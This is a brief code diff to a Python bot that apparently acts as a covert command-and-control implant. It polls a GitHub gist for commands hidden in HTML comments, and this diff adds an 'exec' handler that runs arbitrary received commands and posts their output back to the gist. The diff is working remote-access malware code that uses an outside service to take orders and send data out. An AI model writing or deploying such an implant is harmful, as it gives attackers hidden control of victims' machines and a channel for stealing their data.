@@ -36,6 +36,7 @@ def send_resp(data: str):
     'comm.md': InputFileContent(f'hi\n<!-- res {data} -->')
   })
 
+print('Bot is running...')
 while True:
   comm = g.get_gist(gist.id).files.get('comm.md')
   if comm is not None and comm.content[8:11] == 'req':
@@ -52,7 +53,8 @@ while True:
     elif cmd[0] == 'scp':
       pass
     elif cmd[0] == 'exec':
-      pass
+      res = run(cmd[1:], stdout=PIPE)
+      send_resp(res.stdout.decode('ascii'))
     else:
       send_resp('err')
   sleep(5)
